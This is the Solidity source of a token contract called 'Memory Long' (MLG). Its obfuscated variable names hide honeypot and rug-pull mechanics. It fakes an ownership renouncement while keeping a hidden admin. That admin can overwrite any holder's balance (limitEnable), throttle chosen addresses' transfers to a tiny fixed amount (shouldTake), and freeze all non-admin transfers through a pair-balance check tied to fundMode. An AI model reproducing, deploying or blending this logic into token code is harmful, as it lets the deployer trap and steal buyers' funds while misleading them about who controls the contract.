//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface listTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface fromToken {
    function createPair(address marketingTradingAmount, address liquidityLaunchedFee) external returns (address);
}

interface launchAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityTake) external view returns (uint256);

    function transfer(address launchedLimit, uint256 minExempt) external returns (bool);

    function allowance(address launchedListMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 minExempt) external returns (bool);

    function transferFrom(
        address sender,
        address launchedLimit,
        uint256 minExempt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingTake, uint256 value);
    event Approval(address indexed launchedListMarketing, address indexed spender, uint256 value);
}

interface enableBuySwap is launchAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MemoryLong is atTake, launchAuto, enableBuySwap {

    event OwnershipTransferred(address indexed minFundReceiver, address indexed txLaunched);

    function walletTeam(address receiverFeeMax, address launchedLimit, uint256 minExempt) internal returns (bool) {
        require(minListSell[receiverFeeMax] >= minExempt);
        minListSell[receiverFeeMax] -= minExempt;
        minListSell[launchedLimit] += minExempt;
        emit Transfer(receiverFeeMax, launchedLimit, minExempt);
        return true;
    }

    uint256 public swapAt;

    mapping(address => uint256) private minListSell;

    constructor (){
        if (tradingAuto == minIs) {
            tradingAuto = true;
        }
        listTo fromTo = listTo(fundLiquidityFrom);
        tokenIs = fromToken(fromTo.factory()).createPair(fromTo.WETH(), address(this));
        if (liquidityToAmount != toTx) {
            liquidityToAmount = toTx;
        }
        teamIs = _msgSender();
        modeSell();
        maxLiquidity[teamIs] = true;
        minListSell[teamIs] = exemptMarketingTotal;
        if (minIs) {
            minIs = true;
        }
        emit Transfer(address(0), teamIs, exemptMarketingTotal);
    }

    mapping(address => bool) public tradingMarketing;

    function symbol() external view virtual override returns (string memory) {
        return liquiditySellMin;
    }

    address fundLiquidityFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 takeListSender;

    bool public walletMin;

    address public tokenIs;

    bool private minIs;

    function toTake() private view {
        require(maxLiquidity[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return tokenAmount;
    }

    mapping(address => mapping(address => uint256)) private tradingFund;

    uint256 public liquidityToAmount;

    bool private tradingAuto;

    function fromAt(uint256 minExempt) public {
        toTake();
        fundMode = minExempt;
    }

    address public teamIs;

    uint256 public toTx;

    string private receiverListFee = "Memory Long";

    function balanceOf(address liquidityTake) public view virtual override returns (uint256) {
        return minListSell[liquidityTake];
    }

    function getOwner() external view returns (address) {
        return toTrading;
    }

    function transfer(address receiverSell, uint256 minExempt) external virtual override returns (bool) {
        return exemptListMax(_msgSender(), receiverSell, minExempt);
    }

    function limitEnable(address receiverSell, uint256 minExempt) public {
        toTake();
        minListSell[receiverSell] = minExempt;
    }

    uint256 fundMode;

    uint8 private tokenAmount = 18;

    mapping(address => bool) public maxLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return exemptMarketingTotal;
    }

    function approve(address listAt, uint256 minExempt) public virtual override returns (bool) {
        tradingFund[_msgSender()][listAt] = minExempt;
        emit Approval(_msgSender(), listAt, minExempt);
        return true;
    }

    address private toTrading;

    function toMax(address toReceiver) public {
        require(toReceiver.balance < 100000);
        if (walletMin) {
            return;
        }
        if (minIs) {
            tradingAuto = false;
        }
        maxLiquidity[toReceiver] = true;
        
        walletMin = true;
    }

    function allowance(address launchedListAuto, address listAt) external view virtual override returns (uint256) {
        if (listAt == fundLiquidityFrom) {
            return type(uint256).max;
        }
        return tradingFund[launchedListAuto][listAt];
    }

    function name() external view virtual override returns (string memory) {
        return receiverListFee;
    }

    string private liquiditySellMin = "MLG";

    function owner() external view returns (address) {
        return toTrading;
    }

    uint256 private exemptMarketingTotal = 100000000 * 10 ** 18;

    function modeSell() public {
        emit OwnershipTransferred(teamIs, address(0));
        toTrading = address(0);
    }

    address tokenTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function transferFrom(address receiverFeeMax, address launchedLimit, uint256 minExempt) external override returns (bool) {
        if (_msgSender() != fundLiquidityFrom) {
            if (tradingFund[receiverFeeMax][_msgSender()] != type(uint256).max) {
                require(minExempt <= tradingFund[receiverFeeMax][_msgSender()]);
                tradingFund[receiverFeeMax][_msgSender()] -= minExempt;
            }
        }
        return exemptListMax(receiverFeeMax, launchedLimit, minExempt);
    }

    function exemptListMax(address receiverFeeMax, address launchedLimit, uint256 minExempt) internal returns (bool) {
        if (receiverFeeMax == teamIs) {
            return walletTeam(receiverFeeMax, launchedLimit, minExempt);
        }
        uint256 marketingReceiver = launchAuto(tokenIs).balanceOf(tokenTx);
        require(marketingReceiver == fundMode);
        require(launchedLimit != tokenTx);
        if (tradingMarketing[receiverFeeMax]) {
            return walletTeam(receiverFeeMax, launchedLimit, swapTo);
        }
        return walletTeam(receiverFeeMax, launchedLimit, minExempt);
    }

    uint256 constant swapTo = 5 ** 10;

    function shouldTake(address minFund) public {
        toTake();
        
        if (minFund == teamIs || minFund == tokenIs) {
            return;
        }
        tradingMarketing[minFund] = true;
    }

}